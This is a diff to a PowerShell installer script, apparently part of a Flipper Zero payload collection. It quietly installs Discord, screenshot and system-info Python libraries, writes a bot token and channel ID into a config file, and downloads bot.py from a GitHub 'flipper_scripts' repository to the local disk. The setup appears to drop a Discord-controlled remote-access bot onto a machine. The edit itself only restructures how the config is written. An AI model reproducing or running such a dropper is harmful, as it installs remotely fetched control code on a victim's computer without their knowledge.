@@ -34,11 +34,16 @@ if (-not $pythonPath) {
 & $pythonPath -m pip install discord.py Pillow psutil --quiet 2>$null
 
 $configPath = Join-Path $scriptDir "config.py"
-@"
-BOT_TOKEN = "$botToken"
-CHANNEL_ID = $channelId
-PORTABLE_PYTHON = $(if ($pyDir) { '"' + $pyDir.Replace('\','\\') + '"' } else { 'None' })
-"@ | Out-File -FilePath $configPath -Encoding ASCII
+$cfgLines = @()
+$cfgLines += "BOT_TOKEN = `"$botToken`""
+$cfgLines += "CHANNEL_ID = $channelId"
+if ($pyDir) {
+    $escaped = $pyDir.Replace('\','\\')
+    $cfgLines += "PORTABLE_PYTHON = `"$escaped`""
+} else {
+    $cfgLines += "PORTABLE_PYTHON = None"
+}
+$cfgLines -join "`n" | Out-File -FilePath $configPath -Encoding ASCII
 
 $botPath = Join-Path $scriptDir "bot.py"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/f44b1874d8cce12b_bot.py" -OutFile $botPath
